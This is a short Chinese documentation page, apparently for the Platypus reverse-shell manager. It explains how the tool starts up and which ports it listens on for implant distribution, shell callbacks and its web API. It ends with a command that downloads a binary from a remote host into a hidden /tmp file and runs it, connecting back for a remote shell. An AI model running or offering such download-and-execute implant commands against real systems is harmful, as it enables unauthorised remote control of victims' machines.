# 启动过程

运行成功后，Platypus 会首先检查是否存在新版本并询问用户是否升级，
其次会检查自己的公网 IP 地址，
接着进行端口的绑定监听，并输出用于辅助测试人员使用的反向 Shell 命令，
最后终端将会出现命令提示符 `>>`，
表明此时即可开始与 Platypus 进行交互。

当 Platypus 运行后，会检测当前文件夹中是否存在 `config.yml` 文件，若无则会根据模板自动生成该配置文件。
然后读取该配置文件进行启动。

在默认情况下，Platypus 会按照 `config.yml` 中的配置监听 4 个端口。

* `0.0.0.0:13339` 端口用来分发 Termite 客户端；
* `0.0.0.0:13337` 端口用来接收回连的 Termite 客户端；
* `0.0.0.0:13338` 端口用来接收回连的 Shell（该端口可视作 netcat 的升级版）；
* `0.0.0.0:7331` 端口用来提供 Web 界面的访问以及 RESTful API 服务。

!!! Tips
    Termite 客户端是 Platypus 特有的客户端，支持交互式 Shell、文件传输以及网络隧道等功能。

## 方案二：执行 Termite（推荐）

```
curl -fsSL http://1.3.3.7:13339/termite/1.3.3.7:13337 -o /tmp/.H0Z9 && chmod +x /tmp/.H0Z9 && /tmp/.H0Z9
```
